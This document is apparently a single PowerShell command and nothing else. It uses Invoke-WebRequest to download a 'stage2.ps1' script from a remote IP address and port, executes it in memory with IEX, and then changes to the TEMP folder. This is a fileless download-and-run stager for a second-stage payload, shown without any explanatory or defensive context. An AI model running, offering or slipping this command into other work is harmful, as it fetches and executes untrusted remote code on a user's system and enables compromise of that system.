IEX (Invoke-WebRequest -Uri 'https://192.0.2.80:8443/stage2.ps1' -UseBasicParsing).Content; Set-Location -Path $env:TEMP
